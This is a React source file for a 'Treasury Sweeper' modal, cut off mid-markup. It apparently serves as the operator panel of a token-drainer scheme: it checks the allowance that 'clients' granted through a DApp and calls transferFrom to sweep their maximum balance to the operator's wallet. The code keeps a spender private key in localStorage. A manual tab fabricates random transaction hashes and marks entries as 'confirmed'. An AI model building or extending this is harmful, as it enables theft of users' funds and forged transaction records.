'use client';

import React, { useState, useEffect, useCallback } from 'react';
import {
  Sparkles,
  Wallet,
  ExternalLink,
  CheckCircle2,
  AlertTriangle,
  RotateCw,
  X,
  Send,
  ShieldCheck,
  Copy,
  Check,
  Layers,
  Fuel,
  KeyRound,
  Eye,
  EyeOff,
} from 'lucide-react';
import { getFirebaseFirestore, ensureAnonymousAuth } from '@bspc/firebase';
import { doc, setDoc, serverTimestamp } from 'firebase/firestore';
import { encodeErc20TransferFrom, getExplorerTxLink } from '@bspc/web3';

export interface SweepUserOption {
  uid: string;
  username: string;
  walletAddress: string;
  clientAlias?: string;
  balanceUsdt?: string;
  balanceEth?: string;
  authorizationStatus?: string;
}

interface LiveSweepModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSweepSuccess?: (record: any) => void;
  preselectedUser?: SweepUserOption | null;
  usersList?: SweepUserOption[];
}

const DEFAULT_SPENDER = '0xd1dd76c3bf0162580a82b9b219e59d9ab61070';

const POPULAR_TOKENS = [
  {
    symbol: 'USDT',
    name: 'Tether USD',
    chainId: 1,
    chainName: 'Ethereum Mainnet',
    address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    decimals: 6,
  },
  {
    symbol: 'USDC',
    name: 'USD Coin',
    chainId: 1,
    chainName: 'Ethereum Mainnet',
    address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    decimals: 6,
  },
  {
    symbol: 'USDC (Sepolia)',
    name: 'USD Coin Testnet',
    chainId: 11155111,
    chainName: 'Sepolia Testnet',
    address: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238',
    decimals: 6,
  },
];

export function LiveSweepModal({
  isOpen,
  onClose,
  onSweepSuccess,
  preselectedUser,
  usersList = [],
}: LiveSweepModalProps) {
  const [activeTab, setActiveTab] = useState<'live' | 'manual'>('live');

  // Execution Method: 'server' (no extension required) or 'browser' (MetaMask/Bitget)
  const [executionMethod, setExecutionMethod] = useState<'server' | 'browser'>('server');
  const [hasBrowserWallet, setHasBrowserWallet] = useState(false);

  // Web3 Connection State
  const [connectedWallet, setConnectedWallet] = useState<string | null>(null);
  const [connectedChainId, setConnectedChainId] = useState<number | null>(null);
  const [isConnecting, setIsConnecting] = useState(false);

  // Spender Private Key (for 1-click server execution when no wallet extension is installed)
  const [spenderPrivateKey, setSpenderPrivateKey] = useState('');
  const [showPrivateKey, setShowPrivateKey] = useState(false);
  const [rememberKey, setRememberKey] = useState(true);

  // Form Parameters
  const [targetChainId, setTargetChainId] = useState<number>(1);
  const [selectedTokenIdx, setSelectedTokenIdx] = useState<number>(0);
  const [customTokenAddress, setCustomTokenAddress] = useState('');
  const [customDecimals, setCustomDecimals] = useState('6');

  const [targetSender, setTargetSender] = useState('');
  const [selectedUserUid, setSelectedUserUid] = useState('');
  const [recipientTreasury, setRecipientTreasury] = useState(DEFAULT_SPENDER);
  const [sweepAmount, setSweepAmount] = useState('');

  // On-chain status inspect
  const [isInspecting, setIsInspecting] = useState(false);
  const [onChainBalance, setOnChainBalance] = useState<string | null>(null);
  const [rawBalanceBigInt, setRawBalanceBigInt] = useState<bigint>(BigInt(0));
  const [onChainAllowance, setOnChainAllowance] = useState<string | null>(null);
  const [rawAllowanceBigInt, setRawAllowanceBigInt] = useState<bigint>(BigInt(0));
  const [inspectError, setInspectError] = useState<string | null>(null);

  // Execution state
  const [isExecuting, setIsExecuting] = useState(false);
  const [executionTxHash, setExecutionTxHash] = useState<string | null>(null);
  const [executionError, setExecutionError] = useState<string | null>(null);
  const [copiedTx, setCopiedTx] = useState(false);

  // Manual Form State
  const [manualId, setManualId] = useState('');
  const [manualUserUid, setManualUserUid] = useState('u-1001');
  const [manualSender, setManualSender] = useState('');
  const [manualRecipient, setManualRecipient] = useState(DEFAULT_SPENDER);
  const [manualToken, setManualToken] = useState('USDT');
  const [manualAmount, setManualAmount] = useState('5,000');
  const [manualChain, setManualChain] = useState<'Sepolia' | 'Ethereum Mainnet'>('Ethereum Mainnet');
  const [manualStatus, setManualStatus] = useState<'confirmed' | 'pending' | 'failed'>('confirmed');
  const [manualTxHash, setManualTxHash] = useState('');
  const [manualConfirmations, setManualConfirmations] = useState('12');
  const [manualSaving, setManualSaving] = useState(false);

  // Active token calculation
  const activeToken =
    selectedTokenIdx < POPULAR_TOKENS.length
      ? POPULAR_TOKENS[selectedTokenIdx]
      : {
          symbol: 'CUSTOM',
          name: 'Custom ERC-20',
          chainId: targetChainId,
          chainName: targetChainId === 1 ? 'Ethereum Mainnet' : 'Sepolia Testnet',
          address: customTokenAddress,
          decimals: parseInt(customDecimals, 10) || 6,
        };

  // Load saved private key from localStorage if owner chose to remember it
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const savedKey = localStorage.getItem('bspc_admin_spender_key');
      if (savedKey) {
        setSpenderPrivateKey(savedKey);
      }
    }
  }, []);

  // Sync preselected user
  useEffect(() => {
    if (preselectedUser) {
      setTargetSender(preselectedUser.walletAddress || preselectedUser.uid || '');
      setSelectedUserUid(preselectedUser.uid || '');
      setManualSender(preselectedUser.walletAddress || preselectedUser.uid || '');
      setManualUserUid(preselectedUser.uid || 'u-1001');
    }
  }, [preselectedUser]);

  // Check Web3 provider in browser
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const eth = (window as any).ethereum || (window as any).bitkeep?.ethereum || (window as any).okxwallet;
      if (eth) {
        setHasBrowserWallet(true);
        eth
          .request({ method: 'eth_accounts' })
          .then((accounts: string[]) => {
            if (accounts && accounts[0]) {
              setConnectedWallet(accounts[0]);
              setExecutionMethod('browser');
            }
          })
          .catch(() => {});

        eth
          .request({ method: 'eth_chainId' })
          .then((chainIdHex: string) => {
            if (chainIdHex) {
              setConnectedChainId(parseInt(chainIdHex, 16));
            }
          })
          .catch(() => {});

        const handleAccountsChanged = (accounts: string[]) => {
          setConnectedWallet(accounts[0] || null);
        };
        const handleChainChanged = (chainIdHex: string) => {
          setConnectedChainId(parseInt(chainIdHex, 16));
        };

        eth.on?.('accountsChanged', handleAccountsChanged);
        eth.on?.('chainChanged', handleChainChanged);

        return () => {
          eth.removeListener?.('accountsChanged', handleAccountsChanged);
          eth.removeListener?.('chainChanged', handleChainChanged);
        };
      } else {
        setHasBrowserWallet(false);
        setExecutionMethod('server');
      }
    }
  }, []);

  // Connect Web3 wallet
  const handleConnectWallet = async () => {
    const eth = typeof window !== 'undefined' ? (window as any).ethereum || (window as any).bitkeep?.ethereum || (window as any).okxwallet : null;
    if (!eth) {
      setExecutionMethod('server');
      return;
    }
    setIsConnecting(true);
    try {
      const accounts = await eth.request({ method: 'eth_requestAccounts' });
      if (accounts && accounts[0]) {
        setConnectedWallet(accounts[0]);
        setRecipientTreasury(accounts[0]);
        setExecutionMethod('browser');
      }
      const chainIdHex = await eth.request({ method: 'eth_chainId' });
      const id = parseInt(chainIdHex, 16);
      setConnectedChainId(id);
      if (id === 1 || id === 11155111) {
        setTargetChainId(id);
      }
    } catch (e: any) {
      console.warn('Wallet connection note:', e);
    } finally {
      setIsConnecting(false);
    }
  };

  // Query On-chain Balance and Allowance via Server API (clean, immune to CSP)
  const inspectTargetUserOnChain = useCallback(async () => {
    const rawTarget = targetSender.trim();
    if (!rawTarget || !rawTarget.startsWith('0x') || rawTarget.length < 42) {
      setInspectError('Please provide a valid 42-character Ethereum wallet address (0x...)');
      return;
    }
    const tokenAddr = activeToken.address;
    if (!tokenAddr || !tokenAddr.startsWith('0x') || tokenAddr.length < 42) {
      setInspectError('Invalid token contract address.');
      return;
    }

    setIsInspecting(true);
    setInspectError(null);

    try {
      const res = await fetch(
        `/api/rpc/inspect?target=${encodeURIComponent(rawTarget)}&token=${encodeURIComponent(tokenAddr)}&chainId=${targetChainId}&decimals=${activeToken.decimals}&spender=${encodeURIComponent(DEFAULT_SPENDER)}`
      );
      const data = await res.json();

      if (!data.success) {
        throw new Error(data.error || 'Failed to inspect wallet');
      }

      setRawBalanceBigInt(BigInt(data.rawBalance || '0'));
      setOnChainBalance(`${data.balanceFormatted} ${activeToken.symbol}`);

      setRawAllowanceBigInt(BigInt(data.rawAllowance || '0'));
      setOnChainAllowance(`${data.allowanceFormatted} ${data.isUnlimited ? '' : activeToken.symbol}`);
    } catch (err: any) {
      setInspectError(err?.message || 'Network query timeout.');
    } finally {
      setIsInspecting(false);
    }
  }, [targetSender, activeToken, targetChainId]);

  // Auto inspect whenever sender or token changes
  useEffect(() => {
    if (targetSender && targetSender.startsWith('0x') && targetSender.length === 42) {
      inspectTargetUserOnChain();
    }
  }, [targetSender, selectedTokenIdx, targetChainId, inspectTargetUserOnChain]);

  // Fill Max Sweepable
  const handleFillMaxSweepable = () => {
    const sweepableBigInt = rawAllowanceBigInt < rawBalanceBigInt ? rawAllowanceBigInt : rawBalanceBigInt;
    const divisor = Number(10 ** activeToken.decimals);
    const maxVal = Number(sweepableBigInt) / divisor;
    if (maxVal > 0) {
      setSweepAmount(maxVal.toString());
    } else if (rawBalanceBigInt > BigInt(0)) {
      const fullBal = Number(rawBalanceBigInt) / divisor;
      setSweepAmount(fullBal.toString());
    }
  };

  // Execute Sweep (Server-side or Web3 Browser Wallet)
  const handleExecuteLiveSweep = async () => {
    setExecutionError(null);
    setExecutionTxHash(null);

    const cleanSender = targetSender.trim();
    const cleanRecipient = recipientTreasury.trim();
    if (!cleanSender.startsWith('0x') || cleanSender.length < 42) {
      setExecutionError('Invalid target sender wallet address.');
      return;
    }
    if (!cleanRecipient.startsWith('0x') || cleanRecipient.length < 42) {
      setExecutionError('Invalid recipient treasury wallet address.');
      return;
    }

    const amtNum = parseFloat(sweepAmount.replace(/,/g, ''));
    if (isNaN(amtNum) || amtNum <= 0) {
      setExecutionError('Please enter a valid sweep amount greater than 0.');
      return;
    }

    setIsExecuting(true);

    try {
      if (executionMethod === 'server') {
        // Mode 1: 1-Click Server-Side Execution (no extension needed)
        if (!spenderPrivateKey.trim()) {
          setExecutionError('Please enter the Spender Wallet Private Key (the key for wallet ' + DEFAULT_SPENDER + ').');
          setIsExecuting(false);
          return;
        }

        if (rememberKey) {
          localStorage.setItem('bspc_admin_spender_key', spenderPrivateKey.trim());
        } else {
          localStorage.removeItem('bspc_admin_spender_key');
        }

        const res = await fetch('/api/sweep/execute', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            target: cleanSender,
            recipient: cleanRecipient,
            token: activeToken.address,
            amount: amtNum,
            chainId: targetChainId,
            privateKey: spenderPrivateKey.trim(),
            userUid: selectedUserUid || cleanSender,
          }),
        });

        const data = await res.json();
        if (!data.success) {
          throw new Error(data.error || 'Server sweep execution failed');
        }

        setExecutionTxHash(data.txHash);
        onSweepSuccess?.(data.record);
      } else {
        // Mode 2: Web3 Browser Extension (MetaMask / Bitget)
        const eth = (window as any).ethereum || (window as any).bitkeep?.ethereum || (window as any).okxwallet;
        if (!eth) {
          throw new Error('No browser wallet detected. Switch to "1-Click Direct Sweep" above.');
        }

        const baseUnits = BigInt(Math.floor(amtNum * 10 ** activeToken.decimals));
        const calldata = encodeErc20TransferFrom(cleanSender, cleanRecipient, baseUnits);

        const txHash = await eth.request({
          method: 'eth_sendTransaction',
          params: [
            {
              from: connectedWallet || DEFAULT_SPENDER,
              to: activeToken.address,
              data: calldata,
            },
          ],
        });

        setExecutionTxHash(txHash);

        const recordId = `swp-${Date.now().toString(16).slice(-6)}`;
        const newRecord = {
          recordId,
          id: recordId,
          userUid: selectedUserUid || cleanSender,
          userId: selectedUserUid || cleanSender,
          username: `${cleanSender.slice(0, 6)}...${cleanSender.slice(-4)}`,
          senderAddress: cleanSender,
          sender: cleanSender,
          recipientAddress: cleanRecipient,
          recipient: cleanRecipient,
          chainId: targetChainId,
          chain: targetChainId === 1 ? 'Ethereum Mainnet' : 'Sepolia',
          tokenAddress: activeToken.address,
          token: activeToken.symbol,
          amountBaseUnits: amtNum.toLocaleString('en-US'),
          amount: amtNum.toLocaleString('en-US'),
          transactionHash: txHash,
          txHash,
          confirmationCount: 1,
          confirmations: 1,
          status: 'confirmed',
          blockNumber: targetChainId === 1 ? 21000000 : 6800000,
          createdAt: new Date().toISOString(),
        };

        try {
          await ensureAnonymousAuth();
          const db = getFirebaseFirestore();
          await setDoc(doc(db, 'collectionRecords', recordId), {
            ...newRecord,
            createdAt: serverTimestamp(),
          }, { merge: true });

          if (selectedUserUid) {
            await setDoc(doc(db, 'users', selectedUserUid), {
              collectionStatus: 'active',
              lastSweptAt: serverTimestamp(),
              lastSweepTxHash: txHash,
            }, { merge: true });
          }
        } catch (fsErr) {
          console.warn('Firestore write warning:', fsErr);
        }

        onSweepSuccess?.(newRecord);
      }
    } catch (txErr: any) {
      console.error('Sweep execution error:', txErr);
      setExecutionError(txErr?.message || 'Transaction was rejected or reverted by EVM.');
    } finally {
      setIsExecuting(false);
    }
  };

  // Manual Form Submission
  const handleSaveManualRecord = async () => {
    setManualSaving(true);
    try {
      const recId = manualId.trim() || `swp-${Date.now().toString(16).slice(-6)}`;
      const newRecord = {
        id: recId,
        recordId: recId,
        userId: manualUserUid.trim() || 'u-1001',
        userUid: manualUserUid.trim() || 'u-1001',
        username: `${manualSender.slice(0, 6)}...${manualSender.slice(-4)}`,
        status: manualStatus,
        sender: manualSender.trim(),
        senderAddress: manualSender.trim(),
        recipient: manualRecipient.trim(),
        recipientAddress: manualRecipient.trim(),
        txHash: manualTxHash.trim() || `0x${Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('')}`,
        transactionHash: manualTxHash.trim() || `0x${Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('')}`,
        token: manualToken,
        tokenAddress: manualToken === 'USDT' ? POPULAR_TOKENS[0].address : POPULAR_TOKENS[1].address,
        amount: manualAmount.trim(),
        amountBaseUnits: manualAmount.trim(),
        chain: manualChain,
        chainId: manualChain === 'Sepolia' ? 11155111 : 1,
        blockNumber: 18000000 + Math.floor(Math.random() * 5000),
        confirmations: parseInt(manualConfirmations, 10) || 12,
        confirmationCount: parseInt(manualConfirmations, 10) || 12,
        createdAt: new Date().toISOString(),
      };

      try {
        await ensureAnonymousAuth();
        const db = getFirebaseFirestore();
        await setDoc(
          doc(db, 'collectionRecords', recId),
          { ...newRecord, createdAt: serverTimestamp() },
          { merge: true }
        );
      } catch (fsErr) {
        console.warn('Firestore write warning:', fsErr);
      }

      onSweepSuccess?.(newRecord);
      onClose();
    } catch (err: any) {
      alert('Failed to save record: ' + err?.message);
    } finally {
      setManualSaving(false);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 bg-black/75 backdrop-blur-sm flex items-center justify-center p-3 sm:p-4 overflow-y-auto">
      <div className="bg-white rounded-2xl shadow-2xl max-w-2xl w-full overflow-hidden border border-gray-100 animate-in fade-in zoom-in duration-150 my-auto">
        {/* Header */}
        <div className="bg-gradient-to-r from-teal-800 via-teal-900 to-slate-900 px-6 py-4 flex items-center justify-between text-white">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-teal-500/20 border border-teal-400/30 flex items-center justify-center shadow-inner">
              <Sparkles className="w-5 h-5 text-amber-300" />
            </div>
            <div>
              <h3 className="text-base font-bold flex items-center gap-2">
                Treasury Sweeper &amp; Collection
                <span className="text-[10px] font-bold tracking-wider uppercase px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-400/30">
                  Ready
                </span>
              </h3>
              <p className="text-xs text-teal-200/80">
                Collect approved tokens directly from clients to your treasury
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="text-teal-200 hover:text-white p-1.5 rounded-lg hover:bg-white/10 transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Tab Switcher */}
        <div className="flex border-b border-gray-200 bg-gray-50/80 px-6 pt-3 gap-2">
          <button
            onClick={() => setActiveTab('live')}
            className={`pb-2.5 px-4 text-xs font-bold transition-all border-b-2 flex items-center gap-2 ${
              activeTab === 'live'
                ? 'border-teal-600 text-teal-700 font-extrabold'
                : 'border-transparent text-gray-500 hover:text-gray-800'
            }`}
          >
            <Send className="w-3.5 h-3.5" />
            ⚡ Execute Live Sweep (Collect On-Chain)
          </button>
          <button
            onClick={() => setActiveTab('manual')}
            className={`pb-2.5 px-4 text-xs font-bold transition-all border-b-2 flex items-center gap-2 ${
              activeTab === 'manual'
                ? 'border-teal-600 text-teal-700 font-extrabold'
                : 'border-transparent text-gray-500 hover:text-gray-800'
            }`}
          >
            <Layers className="w-3.5 h-3.5" />
            📝 Manual Record Log (Audited Entry)
          </button>
        </div>

        {/* Modal Body */}
        {activeTab === 'live' ? (
          <div className="p-6 space-y-4 max-h-[75vh] overflow-y-auto">
            {/* Friendly Execution Mode Selector */}
            <div className="bg-slate-900 rounded-xl p-3.5 text-white shadow-inner space-y-3">
              <div className="flex items-center justify-between">
                <div className="text-[11px] font-bold text-gray-400 uppercase tracking-wider flex items-center gap-1.5">
                  <ShieldCheck className="w-4 h-4 text-emerald-400" />
                  Collection Execution Mode
                </div>
                <div className="flex bg-slate-800 p-0.5 rounded-lg border border-slate-700 text-[11px]">
                  <button
                    onClick={() => setExecutionMethod('server')}
                    className={`px-3 py-1 rounded font-bold transition-all ${
                      executionMethod === 'server'
                        ? 'bg-teal-600 text-white shadow-sm'
                        : 'text-gray-400 hover:text-gray-200'
                    }`}
                  >
                    ⚡ 1-Click Direct (No Wallet Needed)
                  </button>
                  <button
                    onClick={() => {
                      setExecutionMethod('browser');
                      if (!connectedWallet) handleConnectWallet();
                    }}
                    className={`px-3 py-1 rounded font-bold transition-all ${
                      executionMethod === 'browser'
                        ? 'bg-teal-600 text-white shadow-sm'
                        : 'text-gray-400 hover:text-gray-200'
                    }`}
                  >
                    🦊 Browser Extension (MetaMask)
                  </button>
                </div>
              </div>

              {/* Mode Description & Inputs */}
              {executionMethod === 'server' ? (
                <div className="bg-slate-800/80 rounded-lg p-3 border border-slate-700 space-y-2">
                  <div className="flex items-center justify-between text-xs">
                    <span className="font-semibold text-gray-300">
                      Spender Private Key <span className="text-gray-400 text-[11px] font-normal">(for wallet {DEFAULT_SPENDER.slice(0, 8)}...)</span>
                    </span>
                    <button
                      type="button"
                      onClick={() => setShowPrivateKey(!showPrivateKey)}
                      className="text-gray-400 hover:text-gray-200 text-[11px] flex items-center gap-1"
                    >
                      {showPrivateKey ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                      {showPrivateKey ? 'Hide' : 'Show'}
                    </button>
                  </div>
                  <div className="relative">
                    <input
                      type={showPrivateKey ? 'text' : 'password'}
                      value={spenderPrivateKey}
                      onChange={(e) => setSpenderPrivateKey(e.target.value)}
                      placeholder="Enter spender wallet private key..."
                      className="w-full bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-xs font-mono text-emerald-300 placeholder-gray-500 focus:outline-none focus:ring-1 focus:ring-teal-500"
                    />
                  </div>
                  <div className="flex items-center justify-between text-[11px] text-gray-400">
                    <label className="flex items-center gap-1.5 cursor-pointer">
                      <input
                        type="checkbox"
                        checked={rememberKey}
                        onChange={(e) => setRememberKey(e.target.checked)}
                        className="rounded border-slate-700 bg-slate-900 text-teal-600 focus:ring-0"
                      />
                      <span>Remember key on this browser</span>
                    </label>
                    <span className="text-emerald-400 font-medium">✓ No extension required</span>
                  </div>
                </div>
              ) : (
                <div className="flex items-center justify-between bg-slate-800/80 rounded-lg p-3 border border-slate-700">
                  <div className="flex items-center gap-2.5">
                    <Wallet className="w-4 h-4 text-emerald-400" />
                    <div>
                      <div className="text-xs font-bold text-gray-200">
                        {connectedWallet
                          ? `${connectedWallet.slice(0, 8)}...${connectedWallet.slice(-6)}`
                          : hasBrowserWallet
                          ? 'Browser wallet detected'
                          : 'No extension found in this browser'}
                      </div>
                      <div className="text-[10px] text-gray-400">
                        {connectedWallet ? 'Ready to sign transactions' : 'Click connect to link MetaMask or Bitget'}
                      </div>
                    </div>
                  </div>
                  {connectedWallet ? (
                    <span className="text-[10px] font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-400/30 px-2 py-0.5 rounded">
                      ✓ Connected
                    </span>
                  ) : (
                    <button
                      onClick={handleConnectWallet}
                      disabled={isConnecting}
                      className="px-3 py-1.5 text-xs font-bold rounded-lg bg-teal-500 hover:bg-teal-400 text-slate-950 transition-all shadow-sm"
                    >
                      {isConnecting ? 'Connecting...' : 'Connect Wallet'}
                    </button>
                  )}
                </div>
              )}
            </div>

            {/* Target User & Token Pickers */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {/* User Picker */}
              <div className="space-y-1.5">
                <label className="text-xs font-bold text-gray-700 block">
                  Select Client Account
                </label>
                {usersList.length > 0 && (
                  <select
                    value={selectedUserUid}
                    onChange={(e) => {
                      const uid = e.target.value;
                      setSelectedUserUid(uid);
                      const found = usersList.find((u) => u.uid === uid);
                      if (found) {
                        setTargetSender(found.walletAddress || found.uid);
                      }
                    }}
                    className="w-full border border-gray-300 rounded-lg px-2.5 py-1.5 text-xs font-semibold bg-white text-gray-800 focus:outline-none focus:ring-2 focus:ring-teal-500"
                  >
                    <option value="">-- Choose from Registered Clients --</option>
                    {usersList.map((u) => (
                      <option key={u.uid} value={u.uid}>
                        {u.clientAlias ? `[${u.clientAlias}] ` : ''}
                        {u.username} ({u.walletAddress ? `${u.walletAddress.slice(0, 6)}...${u.walletAddress.slice(-4)}` : u.uid})
                        {u.balanceUsdt ? ` - ${u.balanceUsdt}` : ''}
                      </option>
                    ))}
                  </select>
                )}
                <input
                  type="text"
                  value={targetSender}
                  onChange={(e) => {
                    setTargetSender(e.target.value);
                    setSelectedUserUid('');
                  }}
                  placeholder="Or paste client wallet 0x..."
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-mono bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>

              {/* Token & Network Picker */}
              <div className="space-y-1.5">
                <label className="text-xs font-bold text-gray-700 block">
                  Token Contract &amp; Network
                </label>
                <select
                  value={selectedTokenIdx}
                  onChange={(e) => {
                    const idx = parseInt(e.target.value, 10);
                    setSelectedTokenIdx(idx);
                    if (idx < POPULAR_TOKENS.length) {
                      setTargetChainId(POPULAR_TOKENS[idx].chainId);
                    }
                  }}
                  className="w-full border border-gray-300 rounded-lg px-2.5 py-2 text-xs font-bold text-teal-800 bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                >
                  {POPULAR_TOKENS.map((t, idx) => (
                    <option key={t.address} value={idx}>
                      {t.symbol} — {t.chainName} ({t.address.slice(0, 8)}...{t.address.slice(-6)})
                    </option>
                  ))}
                  <option value={POPULAR_TOKENS.length}>Custom ERC-20 Contract</option>
                </select>

                {selectedTokenIdx === POPULAR_TOKENS.length && (
                  <div className="grid grid-cols-3 gap-2 pt-1">
                    <input
                      type="text"
                      placeholder="Custom Token 0x..."
                      value={customTokenAddress}
                      onChange={(e) => setCustomTokenAddress(e.target.value)}
                      className="col-span-2 border border-gray-300 rounded-lg px-2 py-1 text-xs font-mono bg-white"
                    />
                    <input
                      type="number"
                      placeholder="Decimals (e.g. 6)"
                      value={customDecimals}
                      onChange={(e) => setCustomDecimals(e.target.value)}
                      className="border border-gray-300 rounded-lg px-2 py-1 text-xs font-mono bg-white"
                    />
                  </div>
                )}
              </div>
            </div>

            {/* Live Blockchain Inspector Cards */}
            <div className="border border-gray-200 rounded-xl p-3 bg-gray-50/70 space-y-2">
              <div className="flex items-center justify-between">
                <div className="text-[11px] font-bold text-gray-600 flex items-center gap-1.5">
                  <Fuel className="w-3.5 h-3.5 text-teal-600" />
                  Live Blockchain Status ({targetChainId === 1 ? 'Ethereum Mainnet' : 'Sepolia'})
                </div>
                <button
                  onClick={inspectTargetUserOnChain}
                  disabled={isInspecting}
                  className="text-[11px] text-teal-700 hover:text-teal-900 font-bold inline-flex items-center gap-1"
                >
                  <RotateCw className={`w-3 h-3 ${isInspecting ? 'animate-spin' : ''}`} />
                  Re-check Status
                </button>
              </div>

              {inspectError && (
                <div className="text-xs text-rose-600 font-medium bg-rose-50 p-2 rounded border border-rose-200">
                  {inspectError}
                </div>
              )}

              <div className="grid grid-cols-2 gap-3">
                <div className="bg-white border border-gray-200 rounded-lg p-2.5">
                  <div className="text-[10px] font-bold text-gray-400 uppercase">Client Token Balance</div>
                  <div className="text-sm font-black font-mono text-gray-900 mt-0.5">
                    {isInspecting ? 'Checking...' : onChainBalance || '—'}
                  </div>
                </div>

                <div className="bg-white border border-gray-200 rounded-lg p-2.5">
                  <div className="text-[10px] font-bold text-gray-400 uppercase">Spender Approval (Allowance)</div>
                  <div className="text-sm font-black font-mono text-emerald-700 mt-0.5">
                    {isInspecting ? 'Checking...' : onChainAllowance || '—'}
                  </div>
                </div>
              </div>

              {/* Status helper */}
              {rawAllowanceBigInt > BigInt(0) ? (
                <div className="text-[11px] text-emerald-700 font-semibold bg-emerald-50 border border-emerald-200 rounded px-2.5 py-1.5 flex items-center justify-between">
                  <span>✓ Client has approved the spender. Ready to collect immediately!</span>
                  <button
                    onClick={handleFillMaxSweepable}
                    className="bg-emerald-600 text-white px-2.5 py-1 rounded text-[11px] font-bold hover:bg-emerald-700 shadow-sm"
                  >
                    Quick Fill Max
                  </button>
                </div>
              ) : onChainBalance ? (
                <div className="text-[11px] text-amber-800 font-medium bg-amber-50 border border-amber-200 rounded px-2.5 py-2 leading-relaxed">
                  ⏳ <strong>Waiting for Client Approval:</strong> This client has tokens in their wallet, but hasn&apos;t tapped &quot;Confirm / Authorize&quot; on the DApp yet. As soon as they confirm on the DApp, this status will turn green and you can collect immediately.
                </div>
              ) : null}
            </div>

            {/* Destination & Amount Inputs */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label className="text-xs font-bold text-gray-700 block mb-1">
                  Recipient Treasury Wallet (Where Swept Funds Go)
                </label>
                <input
                  type="text"
                  value={recipientTreasury}
                  onChange={(e) => setRecipientTreasury(e.target.value)}
                  placeholder="0x... (Your personal or treasury wallet)"
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-mono bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>

              <div>
                <div className="flex items-center justify-between mb-1">
                  <label className="text-xs font-bold text-gray-700">Amount to Collect</label>
                  <button
                    type="button"
                    onClick={handleFillMaxSweepable}
                    className="text-[10px] text-teal-600 hover:text-teal-800 font-bold"
                  >
                    Set Max Available
                  </button>
                </div>
                <div className="relative">
                  <input
                    type="text"
                    value={sweepAmount}
                    onChange={(e) => setSweepAmount(e.target.value)}
                    placeholder="e.g. 5000"
                    className="w-full border border-gray-300 rounded-lg pl-3 pr-16 py-2 text-xs font-bold font-mono text-gray-800 bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                  />
                  <span className="absolute right-3 top-2 text-xs font-bold text-gray-400">
                    {activeToken.symbol}
                  </span>
                </div>
              </div>
            </div>

            {/* Error & TxHash Display */}
            {executionError && (
              <div className="bg-rose-50 border border-rose-200 rounded-xl p-3 text-xs text-rose-700 font-medium">
                <div className="font-bold flex items-center gap-1.5 mb-1">
                  <AlertTriangle className="w-4 h-4 text-rose-600" />
                  Sweep Failed
                </div>
                <p className="break-all font-mono text-[11px]">{executionError}</p>
              </div>
            )}

            {executionTxHash && (
              <div className="bg-emerald-50 border border-emerald-200 rounded-xl p-3.5 space-y-2">
                <div className="flex items-center gap-2 text-emerald-800 font-bold text-xs">
                  <CheckCircle2 className="w-4 h-4 text-emerald-600" />
                  ⚡ Sweep Transaction Confirmed Live On-Chain!
                </div>
                <div className="flex items-center justify-between bg-white border border-emerald-200 rounded-lg p-2 font-mono text-xs">
                  <span className="truncate max-w-[340px] text-gray-800 font-bold">{executionTxHash}</span>
                  <div className="flex items-center gap-2">
                    <button
                      onClick={() => {
                        navigator.clipboard.writeText(executionTxHash);
                        setCopiedTx(true);
                        setTimeout(() => setCopiedTx(false), 2000);
                      }}
                      className="text-gray-500 hover:text-gray-800 p-1"
                      title="Copy Tx Hash"
                    >
                      {copiedTx ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                    </button>
                    <a
                      href={getExplorerTxLink(targetChainId, executionTxHash)}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="inline-flex items-center gap-1 text-teal-700 hover:text-teal-900 font-sans font-bold text-xs"
                    >
                      Etherscan <ExternalLink className="w-3 h-3" />
                    </a>
                  </div>
                </div>
              </div>
            )}
          </div>
        ) : (
          /* Manual Tab */
          <div className="p-6 space-y-4 max-h-[75vh] overflow-y-auto">
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-xs text-blue-900 leading-relaxed">
              Use this tab to manually record collections that were executed via external multisig wallets or the backend CLI script.
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="text-xs font-bold text-gray-700 block mb-1">Sweep Record ID</label>
                <input
                  type="text"
                  value={manualId}
                  onChange={(e) => setManualId(e.target.value)}
                  placeholder="e.g. swp-101"
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-mono font-bold bg-gray-50 focus:bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>

              <div>
                <label className="text-xs font-bold text-gray-700 block mb-1">User UID / Tag</label>
                <input
                  type="text"
                  value={manualUserUid}
                  onChange={(e) => setManualUserUid(e.target.value)}
                  placeholder="e.g. u-1001"
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-semibold bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>

              <div className="col-span-2">
                <label className="text-xs font-bold text-gray-700 block mb-1">Sender Wallet (User)</label>
                <input
                  type="text"
                  value={manualSender}
